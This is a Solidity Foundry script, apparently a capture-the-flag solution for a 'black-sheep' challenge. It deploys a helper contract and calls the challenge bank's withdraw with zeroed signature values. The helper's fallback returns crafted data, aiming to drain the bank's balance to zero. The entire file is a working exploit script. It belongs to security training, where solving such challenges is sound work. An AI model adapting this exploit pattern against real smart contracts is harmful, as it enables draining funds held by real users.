// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "../src/black-sheep/Challenge.sol";

contract ChallengeHelper {
    ISimpleBank public immutable BANK;

    constructor(ISimpleBank bank) {
        BANK = bank;
    }

    uint public count = 0;

    function deposit() public payable {}

    function withDraw() public payable {
        bytes32 digest = keccak256(abi.encodePacked("dumb"));

        BANK.withdraw{value: 1}(0, 0, 0, 0);
    }

    fallback(bytes calldata data) external payable returns (bytes memory) {
        if (msg.value == 2) {
            revert("fallback");
        } else {
            bytes memory returndata = hex"01";
            return returndata;
        }
    }

    function isSolved() external view returns (bool) {
        return address(BANK).balance == 0;
    }
}

contract ExploitScript is Script {
    Challenge challenge = Challenge(vm.envAddress("CHALLENGE_ADDRESS"));
    address sender = vm.addr(vm.envUint("PRIVATE_KEY"));

    ISimpleBank bank;
    ChallengeHelper helper;

    function setUp() public {}

    function run() public {
        vm.createSelectFork(vm.rpcUrl("paradigm"));
        vm.startBroadcast(sender);
        bank = challenge.BANK();
        helper = new ChallengeHelper(bank);
        helper.deposit{value: 1 ether}();

        helper.withDraw();
        console.log(helper.isSolved());
        console.log("is solved: ", challenge.isSolved());
    }
}
